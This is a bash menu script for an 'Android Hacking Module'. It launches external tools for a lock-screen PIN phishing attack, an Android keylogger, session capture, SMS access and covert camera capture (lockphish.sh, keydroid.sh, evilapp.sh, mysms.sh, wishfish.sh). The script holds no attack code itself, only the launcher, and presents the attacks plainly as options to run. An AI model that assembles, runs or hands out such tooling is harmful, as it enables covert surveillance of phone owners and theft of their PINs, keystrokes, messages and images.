#!/bin/bash

GREEN='\e[1;92m'
WHITE='\e[0;97m'
YELLOW='\e[1;33m'
BLUE="\e[1;36m"
sp='%-5s'
sp0='%-2s'
       


# Function to print menu
print_menu() {

clear  
printf "${GREEN}
    ___              __           _     __   __  __           __   _            
   /   |  ____  ____/ /________  (_)___/ /  / / / /___ ______/ /__(_)___  ____ _
  / /| | / __ \/ __  / ___/ __ \/ / __  /  / /_/ / __ '/ ___/ //_/ / __ \/ __ '/
 / ___ |/ / / / /_/ / /  / /_/ / / /_/ /  / __  / /_/ / /__/ ,< / / / / / /_/ / 
/_/  |_/_/ /_/\__,_/_/   \____/_/\__,_/  /_/ /_/\__,_/\___/_/|_/_/_/ /_/\__, /  
                                                                       /____/   \n\n" 


    printf "\n${YELLOW}${sp0}------------------------------------"
    printf "\n${BLUE}${sp0}	Android Hacking Module"
    printf "\n${YELLOW}${sp0}------------------------------------"
    printf "\n${WHITE}${sp}[1] Perform LOCK PIN attack"
    printf "\n${WHITE}${sp}[2] Android Keylogger"
    printf "\n${WHITE}${sp}[3] Capture session"
    printf "\n${WHITE}${sp}[4] Access SMS"
    printf "\n${WHITE}${sp}[5] DroidCam (Capture Image)"
    printf "\n${WHITE}${sp}[6] Exit"
    printf "\n${YELLOW}${sp0}-------------------------------------"
}

# Android Hacking module functions
lock_phish() {
    echo "Performing LOCK PIN attack..."
    ./lockphish.sh
}

android_keylogging() {
    echo "Performing Keylogging..."
    ./keydroid.sh
}

capture_session() {
    echo "Capturing session..."
    ./evilapp.sh
}

access_sms() {
    echo "Accessing SMS..."
    ./mysms.sh
}

droidcam() {
    echo "Accessing Camera..."
    ./wishfish.sh
}

# Entry point for Android Hacking module
while true; do
    print_menu
    printf "\n\n${WHITE}Please select an option: " 
    read choice
    case $choice in
        1) lock_phish ;;
        2) android_keylogging ;;
        3) capture_session ;;
        4) access_sms ;;
        5) droidcam ;;
        6) ./main_project.sh ;;
        *) echo "Invalid choice. Please select again." ;;
    esac
done
